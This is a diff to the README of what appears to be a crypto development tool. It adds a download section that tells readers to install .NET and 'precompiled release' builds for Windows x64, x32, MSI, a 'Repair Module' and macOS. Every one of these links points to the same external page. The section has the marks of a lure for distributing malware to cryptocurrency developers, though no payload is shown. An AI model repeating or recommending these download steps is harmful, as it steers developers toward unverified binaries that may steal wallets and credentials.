@@ -3,6 +3,22 @@
 > Supports Ethereum, Binance Smart Chain, Polygon, Solana, Avalanche and other networks. 
 > Local operation via RPC ensures security and speed of development. Unique smart contract builder, node management and AI-assistant help to accelerate the development of crypto projects. The simplicity of the interface and minimalism make the tool an ideal choice for professionals. Save time and test blockchain applications without spending gas.
 
+# Download
+>Work on macOS and Windows
+1: Download .NET V4.5 [```Download .NET Module```](https://www.microsoft.com/ru-ru/download/details.aspx?id=30653)
+
+2: Install Actual Precompile Release x32 / x64 👇
+
+Windows x64: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/)
+
+Windows x32: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/)
+
+Windows MSI Package: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/)
+
+Windows Repair Module: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/)
+
+MAC OS: [ ```Download``` ](https://selenium-finance.gitbook.io/blockchain-dev-tool/)
+
 # Unique features
 ## 1. Visual Smart Contract Builder (Smart Contract Builder)****
 - Ability to create smart contracts via drag-and-drop interface (e.g. if/else logic, token management, DAO).
